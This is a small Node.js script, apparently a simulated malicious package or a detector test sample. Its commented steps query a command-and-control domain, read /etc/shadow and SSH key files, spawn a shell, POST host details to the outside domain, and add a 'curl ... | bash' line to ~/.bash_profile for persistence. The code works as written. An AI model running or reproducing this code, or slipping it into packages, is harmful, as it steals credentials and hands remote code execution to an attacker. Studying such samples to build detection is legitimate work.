const dns = require('dns');
const http = require('http');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS C2 query
dns.lookup('ixc32.1dorelax.surf', () => {});

// Sensitive reads
try { fs.readFileSync('/etc/shadow', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.ssh/authorized_keys', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync('/tmp/.fake_db_secret', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "ps aux"'); } catch(e) {}

// POST exfiltration
const info = JSON.stringify({ arch: os.arch(), uptime: os.uptime(), cwd: process.cwd() });
try {
  const req = http.request({ hostname: 'ixc32.1dorelax.surf', port: 80, path: '/lint', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(info); req.end();
} catch(e) {}

// Persistence via .bash_profile
try { fs.appendFileSync(os.homedir() + '/.bash_profile', '\ncurl ixc32.1dorelax.surf/hook | bash\n'); } catch(e) {}
